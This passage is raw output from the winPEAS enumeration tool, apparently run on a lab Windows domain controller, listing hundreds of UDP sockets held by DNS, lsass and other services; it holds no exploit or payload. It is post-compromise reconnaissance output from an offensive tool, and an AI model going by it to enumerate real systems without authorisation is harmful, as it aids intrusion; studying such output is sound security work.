  UDP        0.0.0.0               52942         *:*                            2852              dns
  UDP        0.0.0.0               52943         *:*                            2852              dns
  UDP        0.0.0.0               52944         *:*                            2852              dns
  UDP        0.0.0.0               52945         *:*                            2852              dns
  UDP        0.0.0.0               52946         *:*                            2852              dns
  UDP        0.0.0.0               52947         *:*                            2852              dns
  UDP        0.0.0.0               52948         *:*                            2852              dns
  UDP        0.0.0.0               52949         *:*                            2852              dns
  UDP        0.0.0.0               52950         *:*                            2852              dns
  UDP        0.0.0.0               52951         *:*                            2852              dns
  UDP        0.0.0.0               52952         *:*                            2852              dns
  UDP        0.0.0.0               52953         *:*                            2852              dns
  UDP        0.0.0.0               52954         *:*                            2852              dns
  UDP        0.0.0.0               52955         *:*                            2852              dns
  UDP        0.0.0.0               52956         *:*                            2852              dns
  UDP        0.0.0.0               52957         *:*                            2852              dns
  UDP        0.0.0.0               52958         *:*                            2852              dns
  UDP        0.0.0.0               52959         *:*                            2852              dns
  UDP        0.0.0.0               52960         *:*                            2852              dns
  UDP        0.0.0.0               52961         *:*                            2852              dns
  UDP        0.0.0.0               52962         *:*                            2852              dns
  UDP        0.0.0.0               52963         *:*                            2852              dns
  UDP        0.0.0.0               52964         *:*                            2852              dns
  UDP        0.0.0.0               52965         *:*                            2852              dns
  UDP        0.0.0.0               52966         *:*                            2852              dns
  UDP        0.0.0.0               52967         *:*                            2852              dns
  UDP        0.0.0.0               52968         *:*                            2852              dns
  UDP        0.0.0.0               52969         *:*                            2852              dns
  UDP        0.0.0.0               52970         *:*                            2852              dns
  UDP        0.0.0.0               52971         *:*                            2852              dns
  UDP        0.0.0.0               52972         *:*                            2852              dns
  UDP        0.0.0.0               52973         *:*                            2852              dns
  UDP        0.0.0.0               52974         *:*                            2852              dns
  UDP        0.0.0.0               52975         *:*                            2852              dns
  UDP        0.0.0.0               52976         *:*                            2852              dns
  UDP        0.0.0.0               52977         *:*                            2852              dns
  UDP        0.0.0.0               52978         *:*                            2852              dns
  UDP        0.0.0.0               52979         *:*                            2852              dns
  UDP        0.0.0.0               52980         *:*                            2852              dns
  UDP        0.0.0.0               52981         *:*                            2852              dns
  UDP        0.0.0.0               52982         *:*                            2852              dns
  UDP        0.0.0.0               52983         *:*                            2852              dns
  UDP        0.0.0.0               52984         *:*                            2852              dns
  UDP        0.0.0.0               52985         *:*                            2852              dns
  UDP        0.0.0.0               52986         *:*                            2852              dns
  UDP        0.0.0.0               52987         *:*                            2852              dns
  UDP        0.0.0.0               52988         *:*                            2852              dns
  UDP        0.0.0.0               52989         *:*                            2852              dns
  UDP        0.0.0.0               52990         *:*                            2852              dns
  UDP        0.0.0.0               52991         *:*                            2852              dns
  UDP        0.0.0.0               52992         *:*                            2852              dns
  UDP        0.0.0.0               52993         *:*                            2852              dns
  UDP        0.0.0.0               52994         *:*                            2852              dns
  UDP        0.0.0.0               52995         *:*                            2852              dns
  UDP        0.0.0.0               52996         *:*                            2852              dns
  UDP        0.0.0.0               52997         *:*                            2852              dns
  UDP        0.0.0.0               52998         *:*                            2852              dns
  UDP        0.0.0.0               52999         *:*                            2852              dns
  UDP        0.0.0.0               53000         *:*                            2852              dns
  UDP        0.0.0.0               53001         *:*                            2852              dns
  UDP        0.0.0.0               53002         *:*                            2852              dns
  UDP        0.0.0.0               53003         *:*                            2852              dns
  UDP        0.0.0.0               53004         *:*                            2852              dns
  UDP        0.0.0.0               53005         *:*                            2852              dns
  UDP        0.0.0.0               53006         *:*                            2852              dns
  UDP        0.0.0.0               53007         *:*                            2852              dns
  UDP        0.0.0.0               53008         *:*                            2852              dns
  UDP        0.0.0.0               53009         *:*                            2852              dns
  UDP        0.0.0.0               53010         *:*                            2852              dns
  UDP        0.0.0.0               53011         *:*                            2852              dns
  UDP        0.0.0.0               53012         *:*                            2852              dns
  UDP        0.0.0.0               53013         *:*                            2852              dns
  UDP        0.0.0.0               53014         *:*                            2852              dns
  UDP        0.0.0.0               53015         *:*                            2852              dns
  UDP        0.0.0.0               53016         *:*                            2852              dns
  UDP        0.0.0.0               53017         *:*                            2852              dns
  UDP        0.0.0.0               53018         *:*                            2852              dns
  UDP        0.0.0.0               53019         *:*                            2852              dns
  UDP        0.0.0.0               53020         *:*                            2852              dns
  UDP        0.0.0.0               53021         *:*                            2852              dns
  UDP        0.0.0.0               53022         *:*                            2852              dns
  UDP        0.0.0.0               53023         *:*                            2852              dns
  UDP        0.0.0.0               53024         *:*                            2852              dns
  UDP        0.0.0.0               53025         *:*                            2852              dns
  UDP        0.0.0.0               53026         *:*                            2852              dns
  UDP        0.0.0.0               53027         *:*                            2852              dns
  UDP        0.0.0.0               53028         *:*                            2852              dns
  UDP        0.0.0.0               53029         *:*                            2852              dns
  UDP        0.0.0.0               53030         *:*                            2852              dns
  UDP        0.0.0.0               53031         *:*                            2852              dns
  UDP        0.0.0.0               53032         *:*                            2852              dns
  UDP        0.0.0.0               53033         *:*                            2852              dns
  UDP        0.0.0.0               53034         *:*                            2852              dns
  UDP        0.0.0.0               53035         *:*                            2852              dns
  UDP        0.0.0.0               53036         *:*                            2852              dns
  UDP        0.0.0.0               53037         *:*                            2852              dns
  UDP        0.0.0.0               53038         *:*                            2852              dns
  UDP        0.0.0.0               53039         *:*                            2852              dns
  UDP        0.0.0.0               53040         *:*                            2852              dns
  UDP        0.0.0.0               53041         *:*                            2852              dns
  UDP        0.0.0.0               53042         *:*                            2852              dns
  UDP        0.0.0.0               53043         *:*                            2852              dns
  UDP        0.0.0.0               53044         *:*                            2852              dns
  UDP        0.0.0.0               53045         *:*                            2852              dns
  UDP        0.0.0.0               53046         *:*                            2852              dns
  UDP        0.0.0.0               53047         *:*                            2852              dns
  UDP        0.0.0.0               53048         *:*                            2852              dns
  UDP        0.0.0.0               53049         *:*                            2852              dns
  UDP        0.0.0.0               53050         *:*                            2852              dns
  UDP        0.0.0.0               53051         *:*                            2852              dns
  UDP        0.0.0.0               53052         *:*                            2852              dns
  UDP        0.0.0.0               53053         *:*                            2852              dns
  UDP        0.0.0.0               53054         *:*                            2852              dns
  UDP        0.0.0.0               53055         *:*                            2852              dns
  UDP        0.0.0.0               53056         *:*                            2852              dns
  UDP        0.0.0.0               53057         *:*                            2852              dns
  UDP        0.0.0.0               53058         *:*                            2852              dns
  UDP        0.0.0.0               53059         *:*                            2852              dns
  UDP        0.0.0.0               53060         *:*                            2852              dns
  UDP        0.0.0.0               53061         *:*                            2852              dns
  UDP        0.0.0.0               53062         *:*                            2852              dns
  UDP        0.0.0.0               53063         *:*                            2852              dns
  UDP        0.0.0.0               53064         *:*                            2852              dns
  UDP        0.0.0.0               53065         *:*                            2852              dns
  UDP        0.0.0.0               53066         *:*                            2852              dns
  UDP        0.0.0.0               53067         *:*                            2852              dns
  UDP        0.0.0.0               53068         *:*                            2852              dns
  UDP        0.0.0.0               53069         *:*                            2852              dns
  UDP        0.0.0.0               53070         *:*                            2852              dns
  UDP        0.0.0.0               53071         *:*                            2852              dns
  UDP        0.0.0.0               53072         *:*                            2852              dns
  UDP        0.0.0.0               53073         *:*                            2852              dns
  UDP        0.0.0.0               53074         *:*                            2852              dns
  UDP        0.0.0.0               53075         *:*                            2852              dns
  UDP        0.0.0.0               53076         *:*                            2852              dns
  UDP        0.0.0.0               53077         *:*                            2852              dns
  UDP        0.0.0.0               53078         *:*                            2852              dns
  UDP        0.0.0.0               53079         *:*                            2852              dns
  UDP        0.0.0.0               53080         *:*                            2852              dns
  UDP        0.0.0.0               53081         *:*                            2852              dns
  UDP        0.0.0.0               53082         *:*                            2852              dns
  UDP        0.0.0.0               53083         *:*                            2852              dns
  UDP        0.0.0.0               53084         *:*                            2852              dns
  UDP        0.0.0.0               53085         *:*                            2852              dns
  UDP        0.0.0.0               53086         *:*                            2852              dns
  UDP        0.0.0.0               53087         *:*                            2852              dns
  UDP        0.0.0.0               53088         *:*                            2852              dns
  UDP        0.0.0.0               53089         *:*                            2852              dns
  UDP        0.0.0.0               53090         *:*                            2852              dns
  UDP        0.0.0.0               53091         *:*                            2852              dns
  UDP        0.0.0.0               53092         *:*                            2852              dns
  UDP        0.0.0.0               53093         *:*                            2852              dns
  UDP        0.0.0.0               53094         *:*                            2852              dns
  UDP        0.0.0.0               53095         *:*                            2852              dns
  UDP        0.0.0.0               53096         *:*                            2852              dns
  UDP        0.0.0.0               53097         *:*                            2852              dns
  UDP        0.0.0.0               53098         *:*                            2852              dns
  UDP        0.0.0.0               53099         *:*                            2852              dns
  UDP        0.0.0.0               53100         *:*                            2852              dns
  UDP        0.0.0.0               53101         *:*                            2852              dns
  UDP        0.0.0.0               53102         *:*                            2852              dns
  UDP        0.0.0.0               53103         *:*                            2852              dns
  UDP        0.0.0.0               53104         *:*                            2852              dns
  UDP        0.0.0.0               53105         *:*                            2852              dns
  UDP        0.0.0.0               53106         *:*                            2852              dns
  UDP        0.0.0.0               53107         *:*                            2852              dns
  UDP        0.0.0.0               53108         *:*                            2852              dns
  UDP        0.0.0.0               53109         *:*                            2852              dns
  UDP        0.0.0.0               53110         *:*                            2852              dns
  UDP        0.0.0.0               53111         *:*                            2852              dns
  UDP        0.0.0.0               53112         *:*                            2852              dns
  UDP        0.0.0.0               53113         *:*                            2852              dns
  UDP        0.0.0.0               53114         *:*                            2852              dns
  UDP        0.0.0.0               53115         *:*                            2852              dns
  UDP        0.0.0.0               53116         *:*                            2852              dns
  UDP        0.0.0.0               53117         *:*                            2852              dns
  UDP        0.0.0.0               53118         *:*                            2852              dns
  UDP        0.0.0.0               53119         *:*                            2852              dns
  UDP        0.0.0.0               53120         *:*                            2852              dns
  UDP        0.0.0.0               53121         *:*                            2852              dns
  UDP        0.0.0.0               53122         *:*                            2852              dns
  UDP        0.0.0.0               53123         *:*                            2852              dns
  UDP        0.0.0.0               53124         *:*                            2852              dns
  UDP        0.0.0.0               53125         *:*                            2852              dns
  UDP        0.0.0.0               53126         *:*                            2852              dns
  UDP        0.0.0.0               53127         *:*                            2852              dns
  UDP        0.0.0.0               53128         *:*                            2852              dns
  UDP        0.0.0.0               53129         *:*                            2852              dns
  UDP        0.0.0.0               53130         *:*                            2852              dns
  UDP        0.0.0.0               53131         *:*                            2852              dns
  UDP        0.0.0.0               53132         *:*                            2852              dns
  UDP        0.0.0.0               53133         *:*                            2852              dns
  UDP        0.0.0.0               53134         *:*                            2852              dns
  UDP        0.0.0.0               53135         *:*                            2852              dns
  UDP        0.0.0.0               53136         *:*                            2852              dns
  UDP        0.0.0.0               53137         *:*                            2852              dns
  UDP        0.0.0.0               53138         *:*                            2852              dns
  UDP        0.0.0.0               53139         *:*                            2852              dns
  UDP        0.0.0.0               53140         *:*                            2852              dns
  UDP        0.0.0.0               53141         *:*                            2852              dns
  UDP        0.0.0.0               53142         *:*                            2852              dns
  UDP        0.0.0.0               53143         *:*                            2852              dns
  UDP        0.0.0.0               53144         *:*                            2852              dns
  UDP        0.0.0.0               55382         *:*                            2852              dns
  UDP        0.0.0.0               63889         *:*                            1188              svchost
  UDP        10.10.11.152          53            *:*                            2852              dns
  UDP        10.10.11.152          88            *:*                            660               lsass
  UDP        10.10.11.152          137           *:*                            4                 System
  UDP        10.10.11.152          138           *:*                            4                 System
  UDP        10.10.11.152          464           *:*                            660               lsass
  UDP        127.0.0.1             53            *:*                            2852              dns
  UDP        127.0.0.1             50206         *:*                            2092              svchost
  UDP        127.0.0.1             50640         *:*                            2908              ismserv
  UDP        127.0.0.1             55381         *:*                            2824              dfsrs
  UDP        127.0.0.1             56958         *:*                            3244              C:\Users\legacyy\Documents\winPEASx64.exe
  UDP        127.0.0.1             57751         *:*                            2852              dns
  UDP        127.0.0.1             59846         *:*                            1340              svchost
  UDP        127.0.0.1             61416         *:*                            2724              Microsoft.ActiveDirectory.WebServices
  UDP        127.0.0.1             63734         *:*                            1300              svchost

  Enumerating IPv6 connections
                                                                                                                                                             
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            792               svchost
  UDP        [::]                                        389           *:*                            660               lsass
  UDP        [::]                                        500           *:*                            2868              svchost
  UDP        [::]                                        4500          *:*                            2868              svchost
  UDP        [::]                                        5353          *:*                            1188              svchost
  UDP        [::]                                        5355          *:*                            1188              svchost
  UDP        [::]                                        53145         *:*                            2852              dns
  UDP        [::]                                        53146         *:*                            2852              dns
  UDP        [::]                                        53147         *:*                            2852              dns
  UDP        [::]                                        53148         *:*                            2852              dns
  UDP        [::]                                        53149         *:*                            2852              dns
  UDP        [::]                                        53150         *:*                            2852              dns
  UDP        [::]                                        53151         *:*                            2852              dns
  UDP        [::]                                        53152         *:*                            2852              dns
  UDP        [::]                                        53153         *:*                            2852              dns
  UDP        [::]                                        53154         *:*                            2852              dns
  UDP        [::]                                        53155         *:*                            2852              dns
  UDP        [::]                                        53156         *:*                            2852              dns
  UDP        [::]                                        53157         *:*                            2852              dns
  UDP        [::]                                        53158         *:*                            2852              dns
  UDP        [::]                                        53159         *:*                            2852              dns
  UDP        [::]                                        53160         *:*                            2852              dns
  UDP        [::]                                        53161         *:*                            2852              dns
  UDP        [::]                                        53162         *:*                            2852              dns
  UDP        [::]                                        53163         *:*                            2852              dns
  UDP        [::]                                        53164         *:*                            2852              dns
  UDP        [::]                                        53165         *:*                            2852              dns
  UDP        [::]                                        53166         *:*                            2852              dns
  UDP        [::]                                        53167         *:*                            2852              dns
  UDP        [::]                                        53168         *:*                            2852              dns
  UDP        [::]                                        53169         *:*                            2852              dns
  UDP        [::]                                        53170         *:*                            2852              dns
  UDP        [::]                                        53171         *:*                            2852              dns
  UDP        [::]                                        53172         *:*                            2852              dns
  UDP        [::]                                        53173         *:*                            2852              dns
  UDP        [::]                                        53174         *:*                            2852              dns
  UDP        [::]                                        53175         *:*                            2852              dns
  UDP        [::]                                        53176         *:*                            2852              dns
  UDP        [::]                                        53177         *:*                            2852              dns
  UDP        [::]                                        53178         *:*                            2852              dns
  UDP        [::]                                        53179         *:*                            2852              dns
  UDP        [::]                                        53180         *:*                            2852              dns
  UDP        [::]                                        53181         *:*                            2852              dns
  UDP        [::]                                        53182         *:*                            2852              dns
  UDP        [::]                                        53183         *:*                            2852              dns
  UDP        [::]                                        53184         *:*                            2852              dns
  UDP        [::]                                        53185         *:*                            2852              dns
  UDP        [::]                                        53186         *:*                            2852              dns
  UDP        [::]                                        53187         *:*                            2852              dns
  UDP        [::]                                        53188         *:*                            2852              dns
  UDP        [::]                                        53189         *:*                            2852              dns
  UDP        [::]                                        53190         *:*                            2852              dns
  UDP        [::]                                        53191         *:*                            2852              dns
  UDP        [::]                                        53192         *:*                            2852              dns
  UDP        [::]                                        53193         *:*                            2852              dns
  UDP        [::]                                        53194         *:*                            2852              dns
  UDP        [::]                                        53195         *:*                            2852              dns
  UDP        [::]                                        53196         *:*                            2852              dns
  UDP        [::]                                        53197         *:*                            2852              dns
  UDP        [::]                                        53198         *:*                            2852              dns
  UDP        [::]                                        53199         *:*                            2852              dns
  UDP        [::]                                        53200         *:*                            2852              dns
  UDP        [::]                                        53201         *:*                            2852              dns
  UDP        [::]                                        53202         *:*                            2852              dns
  UDP        [::]                                        53203         *:*                            2852              dns
  UDP        [::]                                        53204         *:*                            2852              dns
  UDP        [::]                                        53205         *:*                            2852              dns
  UDP        [::]                                        53206         *:*                            2852              dns
  UDP        [::]                                        53207         *:*                            2852              dns
  UDP        [::]                                        53208         *:*                            2852              dns
  UDP        [::]                                        53209         *:*                            2852              dns
  UDP        [::]                                        53210         *:*                            2852              dns
  UDP        [::]                                        53211         *:*                            2852              dns
  UDP        [::]                                        53212         *:*                            2852              dns
  UDP        [::]                                        53213         *:*                            2852              dns
  UDP        [::]                                        53214         *:*                            2852              dns
  UDP        [::]                                        53215         *:*                            2852              dns
  UDP        [::]                                        53216         *:*                            2852              dns
  UDP        [::]                                        53217         *:*                            2852              dns
  UDP        [::]                                        53218         *:*                            2852              dns
  UDP        [::]                                        53219         *:*                            2852              dns
  UDP        [::]                                        53220         *:*                            2852              dns
  UDP        [::]                                        53221         *:*                            2852              dns
  UDP        [::]                                        53222         *:*                            2852              dns
  UDP        [::]                                        53223         *:*                            2852              dns
  UDP        [::]                                        53224         *:*                            2852              dns
  UDP        [::]                                        53225         *:*                            2852              dns
  UDP        [::]                                        53226         *:*                            2852              dns
  UDP        [::]                                        53227         *:*                            2852              dns
  UDP        [::]                                        53228         *:*                            2852              dns
  UDP        [::]                                        53229         *:*                            2852              dns
  UDP        [::]                                        53230         *:*                            2852              dns
  UDP        [::]                                        53231         *:*                            2852              dns
  UDP        [::]                                        53232         *:*                            2852              dns
  UDP        [::]                                        53233         *:*                            2852              dns
  UDP        [::]                                        53234         *:*                            2852              dns
  UDP        [::]                                        53235         *:*                            2852              dns
  UDP        [::]                                        53236         *:*                            2852              dns
  UDP        [::]                                        53237         *:*                            2852              dns
  UDP        [::]                                        53238         *:*                            2852              dns
  UDP        [::]                                        53239         *:*                            2852              dns
  UDP        [::]                                        53240         *:*                            2852              dns
  UDP        [::]                                        53241         *:*                            2852              dns
  UDP        [::]                                        53242         *:*                            2852              dns
  UDP        [::]                                        53243         *:*                            2852              dns
  UDP        [::]                                        53244         *:*                            2852              dns
  UDP        [::]                                        53245         *:*                            2852              dns
  UDP        [::]                                        53246         *:*                            2852              dns
  UDP        [::]                                        53247         *:*                            2852              dns
  UDP        [::]                                        53248         *:*                            2852              dns
  UDP        [::]                                        53249         *:*                            2852              dns
  UDP        [::]                                        53250         *:*                            2852              dns
  UDP        [::]                                        53251         *:*                            2852              dns
  UDP        [::]                                        53252         *:*                            2852              dns
  UDP        [::]                                        53253         *:*                            2852              dns
  UDP        [::]                                        53254         *:*                            2852              dns
  UDP        [::]                                        53255         *:*                            2852              dns
  UDP        [::]                                        53256         *:*                            2852              dns
  UDP        [::]                                        53257         *:*                            2852              dns
  UDP        [::]                                        53258         *:*                            2852              dns
  UDP        [::]                                        53259         *:*                            2852              dns
  UDP        [::]                                        53260         *:*                            2852              dns
  UDP        [::]                                        53261         *:*                            2852              dns
  UDP        [::]                                        53262         *:*                            2852              dns
  UDP        [::]                                        53263         *:*                            2852              dns
  UDP        [::]                                        53264         *:*                            2852              dns
  UDP        [::]                                        53265         *:*                            2852              dns
  UDP        [::]                                        53266         *:*                            2852              dns
  UDP        [::]                                        53267         *:*                            2852              dns
  UDP        [::]                                        53268         *:*                            2852              dns
  UDP        [::]                                        53269         *:*                            2852              dns
  UDP        [::]                                        53270         *:*                            2852              dns
  UDP        [::]                                        53271         *:*                            2852              dns
  UDP        [::]                                        53272         *:*                            2852              dns
  UDP        [::]                                        53273         *:*                            2852              dns
  UDP        [::]                                        53274         *:*                            2852              dns
  UDP        [::]                                        53275         *:*                            2852              dns
  UDP        [::]                                        53276         *:*                            2852              dns
  UDP        [::]                                        53277         *:*                            2852              dns
  UDP        [::]                                        53278         *:*                            2852              dns
  UDP        [::]                                        53279         *:*                            2852              dns
  UDP        [::]                                        53280         *:*                            2852              dns
  UDP        [::]                                        53281         *:*                            2852              dns
  UDP        [::]                                        53282         *:*                            2852              dns
  UDP        [::]                                        53283         *:*                            2852              dns
  UDP        [::]                                        53284         *:*                            2852              dns
  UDP        [::]                                        53285         *:*                            2852              dns
  UDP        [::]                                        53286         *:*                            2852              dns
  UDP        [::]                                        53287         *:*                            2852              dns
  UDP        [::]                                        53288         *:*                            2852              dns
  UDP        [::]                                        53289         *:*                            2852              dns
  UDP        [::]                                        53290         *:*                            2852              dns
  UDP        [::]                                        53291         *:*                            2852              dns
  UDP        [::]                                        53292         *:*                            2852              dns
  UDP        [::]                                        53293         *:*                            2852              dns
  UDP        [::]                                        53294         *:*                            2852              dns
  UDP        [::]                                        53295         *:*                            2852              dns
  UDP        [::]                                        53296         *:*                            2852              dns
  UDP        [::]                                        53297         *:*                            2852              dns
  UDP        [::]                                        53298         *:*                            2852              dns
  UDP        [::]                                        53299         *:*                            2852              dns
  UDP        [::]                                        53300         *:*                            2852              dns
  UDP        [::]                                        53301         *:*                            2852              dns
  UDP        [::]                                        53302         *:*                            2852              dns
  UDP        [::]                                        53303         *:*                            2852              dns
  UDP        [::]                                        53304         *:*                            2852              dns
  UDP        [::]                                        53305         *:*                            2852              dns
  UDP        [::]                                        53306         *:*                            2852              dns
  UDP        [::]                                        53307         *:*                            2852              dns
  UDP        [::]                                        53308         *:*                            2852              dns
  UDP        [::]                                        53309         *:*                            2852              dns
  UDP        [::]                                        53310         *:*                            2852              dns
  UDP        [::]                                        53311         *:*                            2852              dns
  UDP        [::]                                        53312         *:*                            2852              dns
  UDP        [::]                                        53313         *:*                            2852              dns
  UDP        [::]                                        53314         *:*                            2852              dns
  UDP        [::]                                        53315         *:*                            2852              dns
  UDP        [::]                                        53316         *:*                            2852              dns
  UDP        [::]                                        53317         *:*                            2852              dns
  UDP        [::]                                        53318         *:*                            2852              dns
  UDP        [::]                                        53319         *:*                            2852              dns
  UDP        [::]                                        53320         *:*                            2852              dns
  UDP        [::]                                        53321         *:*                            2852              dns
  UDP        [::]                                        53322         *:*                            2852              dns
  UDP        [::]                                        53323         *:*                            2852              dns
  UDP        [::]                                        53324         *:*                            2852              dns
  UDP        [::]                                        53325         *:*                            2852              dns
  UDP        [::]                                        53326         *:*                            2852              dns
  UDP        [::]                                        53327         *:*                            2852              dns
  UDP        [::]                                        53328         *:*                            2852              dns
  UDP        [::]                                        53329         *:*                            2852              dns
  UDP        [::]                                        53330         *:*                            2852              dns
  UDP        [::]                                        53331         *:*                            2852              dns
  UDP        [::]                                        53332         *:*                            2852              dns
  UDP        [::]                                        53333         *:*                            2852              dns
  UDP        [::]                                        53334         *:*                            2852              dns
  UDP        [::]                                        53335         *:*                            2852              dns
  UDP        [::]                                        53336         *:*                            2852              dns
  UDP        [::]                                        53337         *:*                            2852              dns
  UDP        [::]                                        53338         *:*                            2852              dns
  UDP        [::]                                        53339         *:*                            2852              dns
  UDP        [::]                                        53340         *:*                            2852              dns
  UDP        [::]                                        53341         *:*                            2852              dns
  UDP        [::]                                        53342         *:*                            2852              dns
  UDP        [::]                                        53343         *:*                            2852              dns
  UDP        [::]                                        53344         *:*                            2852              dns
  UDP        [::]                                        53345         *:*                            2852              dns
  UDP        [::]                                        53346         *:*                            2852              dns
  UDP        [::]                                        53347         *:*                            2852              dns
  UDP        [::]                                        53348         *:*                            2852              dns
  UDP        [::]                                        53349         *:*                            2852              dns
  UDP        [::]                                        53350         *:*                            2852              dns
  UDP        [::]                                        53351         *:*                            2852              dns
  UDP        [::]                                        53352         *:*                            2852              dns
  UDP        [::]                                        53353         *:*                            2852              dns
  UDP        [::]                                        53354         *:*                            2852              dns
  UDP        [::]                                        53355         *:*                            2852              dns
  UDP        [::]                                        53356         *:*                            2852              dns
  UDP        [::]                                        53357         *:*                            2852              dns
  UDP        [::]                                        53358         *:*                            2852              dns
  UDP        [::]                                        53359         *:*                            2852              dns
  UDP        [::]                                        53360         *:*                            2852              dns
  UDP        [::]                                        53361         *:*                            2852              dns
  UDP        [::]                                        53362         *:*                            2852              dns
  UDP        [::]                                        53363         *:*                            2852              dns
  UDP        [::]                                        53364         *:*                            2852              dns
  UDP        [::]                                        53365         *:*                            2852              dns
  UDP        [::]                                        53366         *:*                            2852              dns
  UDP        [::]                                        53367         *:*                            2852              dns
  UDP        [::]                                        53368         *:*                            2852              dns
  UDP        [::]                                        53369         *:*                            2852              dns
  UDP        [::]                                        53370         *:*                            2852              dns
  UDP        [::]                                        53371         *:*                            2852              dns
  UDP        [::]                                        53372         *:*                            2852              dns
  UDP        [::]                                        53373         *:*                            2852              dns
  UDP        [::]                                        53374         *:*                            2852              dns
  UDP        [::]                                        53375         *:*                            2852              dns
  UDP        [::]                                        53376         *:*                            2852              dns
  UDP        [::]                                        53377         *:*                            2852              dns
  UDP        [::]                                        53378         *:*                            2852              dns
  UDP        [::]                                        53379         *:*                            2852              dns
  UDP        [::]                                        53380         *:*                            2852              dns
  UDP        [::]                                        53381         *:*                            2852              dns
  UDP        [::]                                        53382         *:*                            2852              dns
  UDP        [::]                                        53383         *:*                            2852              dns
  UDP        [::]                                        53384         *:*                            2852              dns
  UDP        [::]                                        53385         *:*                            2852              dns
  UDP        [::]                                        53386         *:*                            2852              dns
  UDP        [::]                                        53387         *:*                            2852              dns
  UDP        [::]                                        53388         *:*                            2852              dns
  UDP        [::]                                        53389         *:*                            2852              dns
  UDP        [::]                                        53390         *:*                            2852              dns
  UDP        [::]                                        53391         *:*                            2852              dns
  UDP        [::]                                        53392         *:*                            2852              dns
  UDP        [::]                                        53393         *:*                            2852              dns
  UDP        [::]                                        53394         *:*                            2852              dns
  UDP        [::]                                        53395         *:*                            2852              dns
  UDP        [::]                                        53396         *:*                            2852              dns
  UDP        [::]                                        53397         *:*                            2852              dns
  UDP        [::]                                        53398         *:*                            2852              dns
  UDP        [::]                                        53399         *:*                            2852              dns
  UDP        [::]                                        53400         *:*                            2852              dns
  UDP        [::]                                        53401         *:*                            2852              dns
  UDP        [::]                                        53402         *:*                            2852              dns
  UDP        [::]                                        53403         *:*                            2852              dns
  UDP        [::]                                        53404         *:*                            2852              dns
  UDP        [::]                                        53405         *:*                            2852              dns
  UDP        [::]                                        53406         *:*                            2852              dns
  UDP        [::]                                        53407         *:*                            2852              dns
  UDP        [::]                                        53408         *:*                            2852              dns
  UDP        [::]                                        53409         *:*                            2852              dns
  UDP        [::]                                        53410         *:*                            2852              dns
  UDP        [::]                                        53411         *:*                            2852              dns
  UDP        [::]                                        53412         *:*                            2852              dns
  UDP        [::]                                        53413         *:*                            2852              dns
  UDP        [::]                                        53414         *:*                            2852              dns
  UDP        [::]                                        53415         *:*                            2852              dns
  UDP        [::]                                        53416         *:*                            2852              dns
  UDP        [::]                                        53417         *:*                            2852              dns
  UDP        [::]                                        53418         *:*                            2852              dns
  UDP        [::]                                        53419         *:*                            2852              dns
  UDP        [::]                                        53420         *:*                            2852              dns
  UDP        [::]                                        53421         *:*                            2852              dns
  UDP        [::]                                        53422         *:*                            2852              dns
  UDP        [::]                                        53423         *:*                            2852              dns
  UDP        [::]                                        53424         *:*                            2852              dns
  UDP        [::]                                        53425         *:*                            2852              dns
  UDP        [::]                                        53426         *:*                            2852              dns
  UDP        [::]                                        53427         *:*                            2852              dns
  UDP        [::]                                        53428         *:*                            2852              dns
  UDP        [::]                                        53429         *:*                            2852              dns
  UDP        [::]                                        53430         *:*                            2852              dns
  UDP        [::]                                        53431         *:*                            2852              dns
  UDP        [::]                                        53432         *:*                            2852              dns
  UDP        [::]                                        53433         *:*                            2852              dns
  UDP        [::]                                        53434         *:*                            2852              dns
  UDP        [::]                                        53435         *:*                            2852              dns
  UDP        [::]                                        53436         *:*                            2852              dns
  UDP        [::]                                        53437         *:*                            2852              dns
  UDP        [::]                                        53438         *:*                            2852              dns
  UDP        [::]                                        53439         *:*                            2852              dns
  UDP        [::]                                        53440         *:*                            2852              dns
  UDP        [::]                                        53441         *:*                            2852              dns
  UDP        [::]                                        53442         *:*                            2852              dns
  UDP        [::]                                        53443         *:*                            2852              dns
  UDP        [::]                                        53444         *:*                            2852              dns
  UDP        [::]                                        53445         *:*                            2852              dns
  UDP        [::]                                        53446         *:*                            2852              dns
  UDP        [::]                                        53447         *:*                            2852              dns
  UDP        [::]                                        53448         *:*                            2852              dns
  UDP        [::]                                        53449         *:*                            2852              dns
  UDP        [::]                                        53450         *:*                            2852              dns
  UDP        [::]                                        53451         *:*                            2852              dns
  UDP        [::]                                        53452         *:*                            2852              dns
  UDP        [::]                                        53453         *:*                            2852              dns
  UDP        [::]                                        53454         *:*                            2852              dns
  UDP        [::]                                        53455         *:*                            2852              dns
  UDP        [::]                                        53456         *:*                            2852              dns
  UDP        [::]                                        53457         *:*                            2852              dns
  UDP        [::]                                        53458         *:*                            2852              dns
  UDP        [::]                                        53459         *:*                            2852              dns
  UDP        [::]                                        53460         *:*                            2852              dns
  UDP        [::]                                        53461         *:*                            2852              dns
  UDP        [::]                                        53462         *:*                            2852              dns
  UDP        [::]                                        53463         *:*                            2852              dns
  UDP        [::]                                        53464         *:*                            2852              dns
  UDP        [::]                                        53465         *:*                            2852              dns
  UDP        [::]                                        53466         *:*                            2852              dns
  UDP        [::]                                        53467         *:*                            2852              dns
  UDP        [::]                                        53468         *:*                            2852              dns
  UDP        [::]                                        53469         *:*                            2852              dns
  UDP        [::]                                        53470         *:*                            2852              dns
  UDP        [::]                                        53471         *:*                            2852              dns
  UDP        [::]                                        53472         *:*                            2852              dns
  UDP        [::]                                        53473         *:*                            2852              dns
  UDP        [::]                                        53474         *:*                            2852              dns
  UDP        [::]                                        53475         *:*                            2852              dns
  UDP        [::]                                        53476         *:*                            2852              dns
  UDP        [::]                                        53477         *:*                            2852              dns
  UDP        [::]                                        53478         *:*                            2852              dns
  UDP        [::]                                        53479         *:*                            2852              dns
  UDP        [::]                                        53480         *:*                            2852              dns
  UDP        [::]                                        53481         *:*                            2852              dns
  UDP        [::]                                        53482         *:*                            2852              dns
  UDP        [::]                                        53483         *:*                            2852              dns
  UDP        [::]                                        53484         *:*                            2852              dns
  UDP        [::]                                        53485         *:*                            2852              dns
  UDP        [::]                                        53486         *:*                            2852              dns
  UDP        [::]                                        53487         *:*                            2852              dns
  UDP        [::]                                        53488         *:*                            2852              dns
  UDP        [::]                                        53489         *:*                            2852              dns
  UDP        [::]                                        53490         *:*                            2852              dns
  UDP        [::]                                        53491         *:*                            2852              dns
  UDP        [::]                                        53492         *:*                            2852              dns
  UDP        [::]                                        53493         *:*                            2852              dns
  UDP        [::]                                        53494         *:*                            2852              dns
  UDP        [::]                                        53495         *:*                            2852              dns
  UDP        [::]                                        53496         *:*                            2852              dns
  UDP        [::]                                        53497         *:*                            2852              dns
